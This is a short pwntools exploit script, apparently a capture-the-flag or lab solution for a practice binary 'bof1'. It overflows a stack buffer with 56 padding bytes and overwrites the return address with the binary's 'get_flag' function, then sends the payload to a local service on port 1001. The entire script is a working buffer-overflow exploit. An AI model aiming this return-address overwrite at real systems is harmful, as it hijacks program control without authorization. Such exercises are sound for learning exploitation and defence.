from pwn import *

context.log_level = 'debug'

e = ELF('./bof1')
p = remote('127.0.0.1', 1001)
get_flag = e.symbols['get_flag']
payload = b'a' * 48
payload += b'b' * 4
payload += b'c' * 4
payload += p32(get_flag)

p.sendline(payload)
p.interactive()
